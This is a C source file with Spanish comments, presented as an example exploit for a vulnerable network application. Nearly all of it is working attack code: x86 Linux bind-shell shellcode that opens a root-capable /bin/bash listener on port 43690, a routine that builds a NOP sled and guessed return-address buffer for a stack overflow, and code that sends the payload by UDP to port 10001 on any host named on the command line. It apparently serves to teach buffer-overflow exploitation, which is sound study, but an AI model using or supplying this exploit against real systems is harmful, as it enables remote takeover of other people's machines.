/*
  Ejemplo de programa de explotación para aplicación vulnerable de red
*/
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <errno.h>
    #include <string.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #define MYPORT 10001   // puerto de conexión de destino

char shellcode[] =
// --- abre un shell remoto en el puerto 0xAAAA (43690)
"\x31\xc0\x40\x89\x46\x0c\x89\xc3\x40\x89\x46\x08\x04\x04\x89\x46\x10"
"\x8d\x4e\x08\xb0\x66\xcd\x80\x89\xc2\x31\xc0\xc6\x46\x08\x02\x66\xc7"
"\x46\x0a\xaa\xaa\x89\x46\x0c\x89\x56\x11\x8d\x4e\x08\x89\x4e\x15\x43"
"\x89\xd9\x80\xc1\x0e\x89\x4e\x19\x8d\x4e\x11\xb0\x66\xcd\x80\xb0\x66"
"\x43\x43\xcd\x80\x31\xc0\x43\x89\x46\x15\x89\x46\x19\xb0\x66\xcd\x80"
"\x89\xc3\x31\xc0\x89\x46\x0c\x89\xc1\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd"
"\x80\x41\xb0\x3f\xcd\x80\xeb\x1a\x5e\x31\xc0\x88\x46\x09\x8d\x1e\x89"
"\x5e\x0b\x89\x46\x0f\xb0\x0b\x89\xf3\x8d\x4e\x0b\x8d\x56\x0f\xcd\x80"
"\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";

char *buffer, *tmp_ptr;
int i, offset;
long esp, ret, *addr_ptr;

unsigned long sp(void)        /*func. que coloca ESP en AX */
{__asm__("movl %esp,%eax");}  /*AX se regresa como valor de la función*/

int prepara_exploit ()
{
    offset = 560;            /* Desplazamiento a partir de dir. en ESP */
    esp = sp();              /* Obtiene dir. de ESP */
    ret = esp - offset;      /* A la dir. de retorno restamos el */
    			           /* desplazamiento */
    printf("--- Apuntador a pila (ESP)        : 0x%x\n",esp);
    printf("--- Desplazamiento desde pila ESP : 0x%x\n",offset);
    printf("--- Dir. de retorno estimada      : 0x%x\n\n",ret);
 /* Reserva 400 bytes de memoria para crear cadena de inyección 
    (en heap) */
    buffer = malloc(400);
 /* Llena primero el buffer con la dirección de retorno estimada */
    tmp_ptr = buffer;
    addr_ptr = (long *) tmp_ptr;
    for (i=0; i < 400; i+=4)
    { *(addr_ptr++)=ret;}
 /* Sobreescribe ahora los primeros 40 bytes con NOPs para 
    escalera hacia código */
    for (i=0; i < 40; i++)
    { buffer[i] = '\x90';}
 /* Finalmente pega el código al final de los NOPs */
    tmp_ptr = buffer+40;
    for(i=0; i < strlen(shellcode); i++)
    { *(tmp_ptr++) = shellcode[i];}
 /* Coloca un 0 como final de la cadena*/
    buffer[400-1]=0;
    return 0;
}

int main(int argc, char *argv[])
{
    int sockfd;
    struct sockaddr_in their_addr;
    struct hostent *he;
    int numbytes;
    if (argc != 2) {
        fprintf(stderr,"uso: exploit hostname\n");
        exit(1);
    }
       // obtiene info del host
    if ((he=gethostbyname(argv[1])) == NULL) 
    {  
        perror("gethostbyname");
        exit(1);
    }
       //Define tipo de conexión: datagramas/UDP
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) 
    {
        perror("socket");
        exit(1);
    }
    their_addr.sin_family = AF_INET;     // host byte order
    their_addr.sin_port = htons(MYPORT); // short, network byte order
    their_addr.sin_addr = *((struct in_addr *)he->h_addr);
       // borra el resto de la estructura:
    memset(&(their_addr.sin_zero), '\0', 8); 
    prepara_exploit(); // prepara la cadena de exploit.
       // Se conecta al servidor y envía la cadena de explotación:
    if ((numbytes=sendto(sockfd, buffer, strlen(buffer), 0,
         (struct sockaddr *)&their_addr, 
          sizeof(struct sockaddr))) == -1) 
    {
        perror("sendto");
        exit(1);
    }
    printf("enviados %d bytes a %s\n", numbytes,
           inet_ntoa(their_addr.sin_addr));
    close(sockfd);
       // Libera la memoria y termina el programa
    free(buffer);
    return 0;
}

